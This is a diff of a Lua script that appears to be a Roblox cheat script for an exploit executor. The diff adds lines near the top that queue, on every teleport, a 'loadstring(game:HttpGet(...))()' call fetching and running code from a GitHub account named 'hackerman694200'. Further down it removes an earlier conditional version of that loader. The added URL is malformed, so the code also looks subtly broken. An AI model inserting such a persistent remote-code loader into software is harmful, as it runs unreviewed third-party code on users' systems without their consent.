@@ -82,6 +82,11 @@ local MoneyMade, RunTime = 0, 0
 local queue = ""
 local queued = false
 
+if syn then 
+    syn.queue_on_teleport("loadstring(game:HttpGet('raw.githubusercontent/hackerman694200/tester/main/codetemp.lua'))()")
+    else
+        queue_on_teleport("loadstring(game:HttpGet('raw.githubusercontent/hackerman694200/tester/main/codetemp.lua'))()")
+end
 local ui_options = {
 	main_color = Color3.fromRGB(41, 74, 122),
 	min_size = Vector2.new(400, 300),
@@ -3359,9 +3364,9 @@ do
 				queue = queue .. " loadfile('" .. ScriptFile .. "')()"
 
 				if syn then
-					syn.queue_on_teleport(queue) and syn.queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/Hackerman694200/tester/main/codetemp.lua'))()")
+					syn.queue_on_teleport(queue) 
 				else
-					queue_on_teleport(queue) and queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/Hackerman694200/tester/main/codetemp.lua'))()")
+					queue_on_teleport(queue) 
 				end
 			end
 
